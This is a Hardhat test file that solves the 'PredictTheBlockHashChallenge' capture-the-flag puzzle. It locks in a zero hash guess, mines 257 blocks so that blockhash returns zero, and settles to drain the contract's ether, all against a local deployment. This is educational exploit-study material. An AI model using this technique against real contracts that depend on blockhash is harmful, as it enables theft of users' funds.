import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // since after 256 the block has will always be 0 we just need to wait for 256 blocks
    const lockInGuessTx = await target.lockInGuess(
      '0x0000000000000000000000000000000000000000000000000000000000000000',
      { value: utils.parseEther('1') }
    );
    await lockInGuessTx.wait();
    const initBlockNumber = await provider.getBlockNumber();
    for (let index = 0; index < 257; index++) {
      await ethers.provider.send('evm_mine', []);
    }
    const lastBlockNumber = await provider.getBlockNumber();

    expect(lastBlockNumber - initBlockNumber).to.equal(257);

    const attackTx = await target.settle();
    await attackTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
